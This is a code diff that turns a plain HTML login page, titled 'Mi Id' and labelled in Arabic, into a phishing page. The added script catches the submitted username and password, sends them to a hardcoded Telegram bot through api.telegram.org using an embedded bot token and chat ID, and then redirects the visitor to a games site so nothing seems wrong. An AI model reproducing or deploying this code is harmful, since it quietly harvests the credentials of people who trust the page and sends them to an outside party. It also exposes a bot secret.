@@ -1,22 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <title>Mi Id</title>
+
+  <!-- ✅ JavaScript في head مع DOMContentLoaded -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const botToken = '7906447936:AAHz-wQ3PL4EC2gxt4m9cyXNdzzphcNIv2w';
+      const chatId = '7363304178';
+
+      document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        const message = `🔐 محاولة تسجيل دخول:\n👤 الاسم: ${username}\n🔑 كلمة السر: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        })
+        .then(res => res.json())
+        .then(data => {
+          console.log('✅ تم الإرسال:', data);
+          window.location.href = 'https://achrafmeh.github.io/games/'; // تحويل بعد الإرسال
+        })
+        .catch(err => console.error('❌ خطأ:', err));
+      });
+    });
+  </script>
 </head>
 <body>
-    <div class="id">
-      <section class="card">
-        <img style="margin-top: -50px;" src="image.png" alt="games">
-        <br><br><br>
-        <input type="text" placeholder="اسم المستخدم">
-        <input type="password" placeholder="كلمة المرور">
-        <a href="https://achrafmeh.github.io/games/">
-            <button>login</button>
-        </a>
-      </section>
-    </div>
+  <div class="id">
+    <section class="card">
+      <img style="margin-top: -50px;" src="image.png" alt="games" />
+      <br><br><br>
+
+      <!-- ✅ هذا هو الفورم اللي يخدم -->
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">Login</button>
+      </form>
+
+    </section>
+  </div>
 </body>
 </html>
